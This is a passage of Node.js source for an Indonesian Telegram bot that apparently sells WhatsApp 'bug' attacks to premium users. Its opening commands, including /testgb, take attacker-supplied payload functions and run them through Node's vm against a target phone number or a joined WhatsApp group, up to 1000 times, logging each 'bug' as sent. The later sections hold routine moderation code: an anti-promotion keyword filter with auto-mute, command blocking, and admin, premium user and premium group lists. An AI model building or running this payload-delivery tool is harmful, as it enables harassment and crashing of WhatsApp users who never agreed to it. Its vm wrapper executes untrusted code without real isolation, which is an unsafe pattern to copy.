      q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let funcCode = "";

    if (msg.reply_to_message) {
      if (msg.reply_to_message.text) {
        funcCode = msg.reply_to_message.text;
      }
      else if (msg.reply_to_message.document) {

        const fileName =
          msg.reply_to_message.document.file_name || "";

        if (
          !fileName.endsWith(".js") &&
          !fileName.endsWith(".txt")
        ) {
          return ctx.reply(
            "❌ ☇ File harus .js atau .txt",
            { reply_to_message_id: replyId }
          );
        }

        const fileId =
          msg.reply_to_message.document.file_id;

        const fileUrl =
          await ctx.telegram.getFileLink(fileId);

        const response =
          await axios.get(fileUrl.href);

        funcCode = response.data;
      }
    }

    if (!funcCode)
      return ctx.reply(
        "❌ ☇ Reply function text atau file .js/.txt",
        { reply_to_message_id: replyId }
      );

    const processMsg = await ctx.replyWithPhoto(
      tesfunct,
      {
        caption: `<blockquote>💤 MODE : Test Function

🤍 User   : ${username}
🎯 Target : ${formattedNumber}
Type   : Status
🚀 Result : Proses</blockquote>`,
        parse_mode: "HTML",
        reply_to_message_id: replyId,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check Target",
                url: `https://wa.me/${formattedNumber}`,
                style: "danger",
              },
            ],
          ],
        },
      }
    );

    const processMessageId =
      processMsg.message_id;

    const createSafeSock = (sock) => sock;

    const safeSock =
      createSafeSock(sock);

    const matchFunc = funcCode.match(
      /async function\s+([a-zA-Z0-9_]+)/
    );

    if (!matchFunc)
      return ctx.reply(
        "❌ ☇ Function tidak valid",
        { reply_to_message_id: replyId }
      );

    const funcName = matchFunc[1];

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context =
      vm.createContext(sandbox);

    const wrapper = `
${funcCode}

${funcName}
`;

    const fn =
      vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {

      try {

        const arity = fn.length;

        if (arity === 1) {

          await fn(target);

        } else if (arity === 2) {

          await fn(safeSock, target);

        } else {

          await fn(
            safeSock,
            target,
            true
          );

        }

      } catch (err) {

        console.error(err);

      }

      await sleep(200);

    }

    const finalText = `<blockquote>💤 MODE : Test Function

🤍 User   : ${username}
🎯 Target : ${formattedNumber}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>`;

    try {

      await ctx.telegram.editMessageCaption(
        chatId,
        processMessageId,
        undefined,
        finalText,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Check Target",
                  url: `https://wa.me/${formattedNumber}`,
                  style: "danger",
                },
              ],
            ],
          },
        }
      );

    } catch (e) {

      await ctx.replyWithPhoto(
        tesfunct,
        {
          caption: finalText,
          parse_mode: "HTML",
          reply_to_message_id: replyId,
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Check Target",
                  url: `https://wa.me/${formattedNumber}`,
                  style: "danger",
                },
              ],
            ],
          },
        }
      );

    }

  } catch (err) {

    console.error(err);

    ctx.reply(
      "FUNCTION LU EROR BANGKE",
      {
        reply_to_message_id: ctx.message.message_id,
      }
    );

  }
});

bot.command('testgb', checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const chatId = ctx.chat.id;
    const msg = ctx.message;
    const args = ctx.message.text.split(" ");
const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";

    const replyId = msg.reply_to_message
      ? msg.reply_to_message.message_id
      : msg.message_id;

    if (args.length < 3)
      return ctx.reply(
        "🪧 ☇ Format: /testgb https://chat.whatsapp.com/xxx 10 (reply function/file)",
        { reply_to_message_id: replyId }
      );

    const groupLink = args[1].trim();
    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));

    if (isNaN(jumlah) || jumlah <= 0)
      return ctx.reply(
        "❌ ☇ Jumlah harus angka",
        { reply_to_message_id: replyId }
      );

    // Validasi link grup
    const inviteRegex = /chat\.whatsapp\.com\/([a-zA-Z0-9]{20,26})/;
    const match = groupLink.match(inviteRegex);
    if (!match)
      return ctx.reply(
        "❌ ☇ Link grup tidak valid",
        { reply_to_message_id: replyId }
      );
    const groupCode = match[1];

    // Ambil funcCode
    let funcCode = "";
    if (msg.reply_to_message) {
      if (msg.reply_to_message.text) {
        funcCode = msg.reply_to_message.text;
      } else if (msg.reply_to_message.document) {
        const fileName = msg.reply_to_message.document.file_name || "";
        if (!fileName.endsWith(".js") && !fileName.endsWith(".txt")) {
          return ctx.reply(
            "❌ ☇ File harus .js atau .txt",
            { reply_to_message_id: replyId }
          );
        }
        const fileId = msg.reply_to_message.document.file_id;
        const fileUrl = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileUrl.href);
        funcCode = response.data;
      }
    }

    if (!funcCode)
      return ctx.reply(
        "❌ ☇ Reply function text atau file .js/.txt",
        { reply_to_message_id: replyId }
      );

    const matchFunc = funcCode.match(/async function\s+([a-zA-Z0-9_]+)/);
    if (!matchFunc)
      return ctx.reply(
        "❌ ☇ Function tidak valid",
        { reply_to_message_id: replyId }
      );

    const funcName = matchFunc[1];

    const processMsg = await ctx.replyWithPhoto(tesfunct, {
      caption: `<blockquote>💤 MODE : Test Function

🤍 User   : ${username}
🎯 Target : ${groupLink}
Type   : Status
🚀 Result : Joining Group</blockquote>`,
      parse_mode: "HTML",
      reply_to_message_id: replyId,
      reply_markup: {
        inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger" }]],
      },
    });

    const processMessageId = processMsg.message_id;
    const safeSock = sock;

    // Join grup
    let targetJid;
    try {
      const groupData = await sock.groupGetInviteInfo(groupCode);
      targetJid = groupData.id;
      await sock.groupAcceptInvite(groupCode);
      await sleep(2500);
      console.log(`[SUCCESS] Berhasil Join: ${targetJid}`);
    } catch (e) {
      if (e.message.includes("409")) {
        // Sudah di dalam grup, lanjut
        console.log("[INFO] Bot sudah ada di dalam grup.");
        // Ambil JID dari invite info kalau belum dapat
        if (!targetJid) {
          try {
            const groupData = await sock.groupGetInviteInfo(groupCode);
            targetJid = groupData.id;
          } catch (_) {}
        }
      } else {
        try {
          await ctx.telegram.editMessageCaption(
            chatId, processMessageId, undefined,
            `❌ ☇ Gagal join grup: ${e.message}`,
            { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }
          );
        } catch (_) {}
        return;
      }
    }

    // Update status ke processing
    try {
      await ctx.telegram.editMessageCaption(
        chatId, processMessageId, undefined,
        `<blockquote>💤 MODE : Test Function

🤍 User   : ${username}
🎯 Target : ${groupLink}
Type   : Status
🚀 Result : Proses</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger", style: "danger" }]],
          },
        }
      );
    } catch (_) {}

    // Setup sandbox & VM
    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target: targetJid,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
      String,
      Array,
      Object,
      JSON,
      Math,
      parseInt,
      parseFloat,
      isNaN,
    };

    const context = vm.createContext(sandbox);
    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    // Loop eksekusi
    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(targetJid);
        } else if (arity === 2) {
          await fn(safeSock, targetJid);
        } else {
          await fn(safeSock, targetJid, true);
        }
        console.log(`[SUCCESS] Bug ke-${i + 1} terkirim.`);
      } catch (err) {
        console.error(`[ERROR] Bug ke-${i + 1} gagal: ${err.message}`);
      }
      await sleep(2000);
    }

    const finalText = `<blockquote>💤 MODE : Test Function

🤍 User   : ${username}
🎯 Target : ${groupLink}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>`;

    try {
      await ctx.telegram.editMessageCaption(
        chatId, processMessageId, undefined,
        finalText,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger" }]],
          },
        }
      );
    } catch (e) {
      await ctx.replyWithPhoto(tesfunct, {
        caption: finalText,
        parse_mode: "HTML",
        reply_to_message_id: replyId,
        reply_markup: {
          inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger" }]],
        },
      });
    }

  } catch (err) {
    console.error(err);
    ctx.reply("FUNCTION LU EROR BANGKE", {
      reply_to_message_id: ctx.message.message_id,
    });
  }
});

////=========ANTI PROMOSI + AUTO MUTE========\\\\

const promoKeywords = [
  'join', 'gabung', 'promo', 'diskon', 'gratis', 'free',
  'klik', 'click', 'http://', 'https://', 't.me/', 'wa.me/',
  'bit.ly', 'linktr', 'invite', 'daftar', 'register', 'sell',
  'fs', 'forsell', 'apk bug', 'apk', 'minat', 'contact',
  'jual', 'beli', 'order', 'harga', 'murah', 'terjangkau',
  'channel', 'group', 'grup', 'bot baru', 'cek bio',
];

const PROMO_MUTE_DURATION_MS = 5 * 60 * 1000;

// Map userId → timestamp mute berakhir
const mutedPromo = new Map();

// Map groupId (string) → boolean
// true  = anti-promo AKTIF di group tersebut
// false = anti-promo MATI di group tersebut
// Jika groupId tidak ada di map → default MATI (harus dinyalakan manual)
const antiPromoGroups = new Map();

// ── Helper ──────────────────────────────────────────────────
function isPromoMessage(text) {
  if (!text) return false;
  const lower = text.toLowerCase();
  return promoKeywords.some(k => lower.includes(k));
}

async function isGroupAdmin(ctx, userId) {
  try {
    const member = await ctx.telegram.getChatMember(ctx.chat.id, userId);
    return ['administrator', 'creator'].includes(member.status);
  } catch {
    return false;
  }
}

// ── Command: /antipromo on|off|status  (Owner & admin group) ─
bot.command('antipromo', async (ctx) => {
  // Hanya berlaku di group
  if (ctx.chat?.type === 'private') {
    return ctx.reply('⚠️ Command ini hanya bisa digunakan di dalam group.');
  }

  const userId = ctx.from.id.toString();
  const groupId = ctx.chat.id.toString();

  // Hanya owner atau admin group yang boleh
  const isOwner = userId === OWNER_ID.toString();
  const isAdmin = await isGroupAdmin(ctx, ctx.from.id);
  if (!isOwner && !isAdmin) {
    return ctx.reply('⛔ Hanya owner atau admin group yang bisa menggunakan command ini.');
  }

  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();
  const groupTitle = ctx.chat.title || groupId;

  if (arg === 'on') {
    antiPromoGroups.set(groupId, true);
    return ctx.reply(
      `✅ *Anti-Promo* telah *diaktifkan* di group ini!\n` +
      `🏠 Group: *${groupTitle}*\n\n` +
      `Setiap pesan promosi akan dihapus & pengirim di-mute 5 menit.`,
      { parse_mode: 'Markdown' }
    );
  } else if (arg === 'off') {
    antiPromoGroups.set(groupId, false);
    return ctx.reply(
      `🔕 *Anti-Promo* telah *dinonaktifkan* di group ini!\n` +
      `🏠 Group: *${groupTitle}*`,
      { parse_mode: 'Markdown' }
    );
  } else {
    // Tampilkan status
    const isActive = antiPromoGroups.get(groupId) === true;
    const status = isActive ? '🟢 *ON*' : '🔴 *OFF*';
    return ctx.reply(
      `ℹ️ Status Anti-Promo di *${groupTitle}*: ${status}\n\n` +
      `Gunakan:\n` +
      `• \`/antipromo on\` — aktifkan di group ini\n` +
      `• \`/antipromo off\` — nonaktifkan di group ini`,
      { parse_mode: 'Markdown' }
    );
  }
});

// ── Middleware: Anti promosi per group ──────────────────────
bot.use(async (ctx, next) => {
  if (!ctx.message?.text) return next();
  if (ctx.chat?.type === 'private') return next();

  const groupId = ctx.chat.id.toString();

  // Cek apakah anti-promo aktif di group ini
  // Default: MATI → harus dinyalakan manual per group
  if (antiPromoGroups.get(groupId) !== true) return next();

  const userId = ctx.from.id.toString();

  // Owner & admin group bebas
  if (userId === OWNER_ID.toString()) return next();
  const isAdmin = await isGroupAdmin(ctx, ctx.from.id);
  if (isAdmin) return next();

  const text = ctx.message.text;
  if (!isPromoMessage(text)) return next();

  const username = ctx.from.username ? `@${ctx.from.username}` : `#${userId}`;
  const fullName = `${ctx.from.first_name || ''}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`.trim();
  const muteStart = new Date();
  const muteEnd = new Date(Date.now() + PROMO_MUTE_DURATION_MS);

  mutedPromo.set(userId, muteEnd.getTime());

  // Hapus pesan promosi
  try {
    await ctx.deleteMessage();
  } catch (e) {
    console.error('Gagal hapus pesan:', e.message);
  }

  // Mute di group via Telegram API
  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, ctx.from.id, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
      },
      until_date: Math.floor(muteEnd.getTime() / 1000),
    });
  } catch (e) {
    console.error('Gagal mute:', e.message);
  }

  const logMessage =
    `\`\`\`javascript\n` +
    `┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓\n` +
    `   >> ANTI PROMOSI — AUTO MUTE <<\n` +
    `┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
    `╭───〔 𝐋𝐎𝐆 𝐈𝐍𝐅𝐎 〕───╮\n` +
    `│ ◈ USER    : ${username}\n` +
    `│ ◈ NAMA    : ${fullName}\n` +
    `│ ◈ USER ID : ${userId}\n` +
    `│ ◈ GROUP   : ${ctx.chat.title || '-'}\n` +
    `│ ◈ PESAN   : ${text.slice(0, 50)}...\n` +
    `│ ◈ MUTE    : 5 Menit\n` +
    `│ ◈ MULAI   : ${formatDateTime(muteStart)}\n` +
    `│ ◈ BEBAS   : ${formatDateTime(muteEnd)}\n` +
    `╰──────────────────────╯\n` +
    `\`\`\``;

  // Log ke OWNER
  try {
    await ctx.telegram.sendPhoto(OWNER_ID, 'https://d.top4top.io/p_3804rkv7i1.jpg', {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log owner:', e.message);
  }

  // Log ke GROUP LOG
  try {
    await ctx.telegram.sendPhoto(LOG_GROUP_ID, 'https://d.top4top.io/p_3804rkv7i1.jpg', {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log group:', e.message);
  }

  // Notif di group
  await ctx.replyWithPhoto('https://d.top4top.io/p_3804rkv7i1.jpg', {
    caption:
      `🚫 *${fullName}* terdeteksi mengirim *pesan promosi* dan telah di-mute!\n\n` +
      `⏰ *Mulai* : ${formatDateTime(muteStart)}\n` +
      `✅ *Bebas* : ${formatDateTime(muteEnd)}`,
    parse_mode: 'Markdown'
  });

  return;
});

bot.command('addpromo', async (ctx) => {
  if (ctx.from.id.toString() !== OWNER_ID) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (!args) return ctx.reply('⚠️ Contoh: /addpromo kata_promo');
  if (promoKeywords.includes(args)) return ctx.reply('⚠️ Keyword sudah ada!');
  promoKeywords.push(args);
  await ctx.reply(`✅ Keyword *${args}* berhasil ditambahkan!`, { parse_mode: 'Markdown' });
});

bot.command('delpromo', async (ctx) => {
  if (ctx.from.id.toString() !== OWNER_ID) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (!args) return ctx.reply('⚠️ Contoh: /delpromo kata_promo');
  const idx = promoKeywords.indexOf(args);
  if (idx === -1) return ctx.reply('⚠️ Keyword tidak ditemukan!');
  promoKeywords.splice(idx, 1);
  await ctx.reply(`✅ Keyword *${args}* berhasil dihapus!`, { parse_mode: 'Markdown' });
});

bot.command('listpromo', async (ctx) => {
  if (ctx.from.id.toString() !== OWNER_ID) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const list = promoKeywords.map((k, i) => `${i + 1}. ${k}`).join('\n');
  await ctx.reply(`📋 *Daftar Keyword Promosi:*\n\n${list}`, { parse_mode: 'Markdown' });
});

bot.command('unmute', async (ctx) => {
  if (ctx.from.id.toString() !== OWNER_ID) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const target = ctx.message.reply_to_message;
  if (!target) return ctx.reply('⚠️ Reply pesan user yang mau di-unmute!');

  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, target.from.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
      },
    });
    mutedPromo.delete(target.from.id.toString());
    await ctx.reply(`✅ *${target.from.first_name}* berhasil di-unmute!`, { parse_mode: 'Markdown' });
  } catch (e) {
    await ctx.reply('❌ Gagal unmute: ' + e.message);
  }
});
///=== comand blockcmd ===\\\
// ===============================
// BLOCK CMD GROUP - TELEGRAF
// ===============================

bot.command("blockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /blockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[groupId])
      db.groupCmdBlock[groupId] = [];

    // sudah ada
    if (db.groupCmdBlock[groupId].includes(cmd)) {
      return ctx.reply("⚠️ Command sudah diblock.");
    }

    db.groupCmdBlock[groupId].push(cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil block command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});


// ===============================
// UNBLOCK CMD GROUP
// ===============================

bot.command("unblockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /unblockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock?.[groupId]) {
      return ctx.reply("⚠️ Tidak ada command yang diblock.");
    }

    db.groupCmdBlock[groupId] =
      db.groupCmdBlock[groupId].filter(c => c !== cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  try {
    const db = loadDB();
    const chatId = String(ctx.chat.id);

    const blocked =
      db.groupCmdBlock?.[chatId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK COMMAND\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});


////=========PREMIUM GROUP========\\\\

const premiumGroupFile = './premiumGroups.json';
let premiumGroups = loadJSON(premiumGroupFile) || [];

// Helper cek apakah group premium
function isGroupPremium(chatId) {
  return premiumGroups.includes(chatId.toString());
}

// Daftarkan group jadi premium
bot.command('addpremgroup', checkOwner, async (ctx) => {
  const chatId = ctx.chat.id.toString();

  if (isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Group ini sudah
│             terdaftar premium!
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups.push(chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 〕───╮
│ ◈ STATUS  : ✅ Berhasil
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ✨ Premium Aktif
│
│  Semua member di group ini
│  sekarang bisa akses fitur
│  premium!
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

// Hapus group dari premium
bot.command('delpremgroup', checkOwner, async (ctx) => {
  const chatId = ctx.chat.id.toString();

  if (!isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ❌ Gagal
│ ◈ REASON  : Group ini bukan
│             group premium!
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups = premiumGroups.filter(id => id !== chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 〕───╮
│ ◈ STATUS  : 🚫 Dihapus
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ❌ Dicabut
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

// Tambah group lain jadi premium via ID (dari private)
bot.command('addpremgroupid', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);

  if (!args[0]) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Format salah!
│
│  Contoh penggunaan:
│  /addpremgroupid -100xxx
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  const chatId = args[0].toString();

  if (isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Group sudah premium!
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups.push(chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 〕───╮
│ ◈ STATUS  : ✅ Berhasil
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ✨ Premium Aktif
│
│  Group berhasil didaftarkan
│  sebagai premium!
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});
// Hapus group lain dari premium via ID
bot.command('delpremgroupid', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);

  if (!args[0]) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Format salah!
│
│  Contoh penggunaan:
│  /delpremgroupid -100xxx
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  const chatId = args[0].toString();

  if (!isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Group bukan
│             group premium!
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups = premiumGroups.filter(id => id !== chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 〕───╮
│ ◈ STATUS  : 🚫 Dihapus
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ❌ Dicabut
│
│  Group berhasil dihapus
│  dari daftar premium!
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

////=========LIST PREM GROUP========\\\\
bot.command('listpremgroup', checkOwner, async (ctx) => {
  if (premiumGroups.length === 0) {
    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐋𝐈𝐒𝐓 〕───╮
│ ◈ STATUS  : ⚠️ Kosong
│ ◈ REASON  : Belum ada group
│             yang terdaftar
│             premium!
╰──────────────────────╯
